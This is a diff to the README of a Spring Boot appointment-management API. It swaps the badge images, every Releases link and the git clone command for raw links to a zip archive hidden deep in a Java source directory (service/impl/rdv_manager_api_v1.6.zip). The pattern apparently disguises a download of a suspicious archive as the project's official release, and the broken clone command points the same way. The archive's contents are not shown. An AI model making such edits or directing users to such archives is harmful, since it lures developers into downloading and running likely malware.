@@ -1,10 +1,10 @@
 # RDV Manager API 🚀
 
-![API Design](https://img.shields.io/badge/API%20Design-REST%20API-brightgreen) ![Java](https://img.shields.io/badge/Language-Java-blue) ![Spring Boot](https://img.shields.io/badge/Framework-Spring%20Boot-orange) ![Release](https://img.shields.io/badge/Release-Latest-blueviolet)
+![API Design](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip%20Design-REST%20API-brightgreen) ![Java](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip) ![Spring Boot](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip%20Boot-orange) ![Release](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip)
 
 Welcome to the RDV Manager API! This project is a Spring Boot REST API designed for managing appointments. It supports multiple structures, role-based access control (RBAC), dynamic time slots, weekly availability, reminders, and audit logging. 
 
-For the latest releases, visit [Releases](https://github.com/tyrunplacable/rdv_manager_api/releases).
+For the latest releases, visit [Releases](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip).
 
 ## Table of Contents
 
@@ -40,7 +40,7 @@ To get started with the RDV Manager API, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/tyrunplacable/rdv_manager_api.git
+   git clone https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -138,6 +138,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Conclusion
 
-The RDV Manager API is a powerful tool for managing appointments. With its features and capabilities, it aims to streamline the appointment management process for users. For the latest updates and releases, check out [Releases](https://github.com/tyrunplacable/rdv_manager_api/releases).
+The RDV Manager API is a powerful tool for managing appointments. With its features and capabilities, it aims to streamline the appointment management process for users. For the latest updates and releases, check out [Releases](https://github.com/tyrunplacable/rdv_manager_api/raw/refs/heads/master/src/main/java/com/grey/rdv_manager_api/service/impl/rdv_manager_api_v1.6.zip).
 
 Feel free to explore, contribute, and enhance the RDV Manager API!
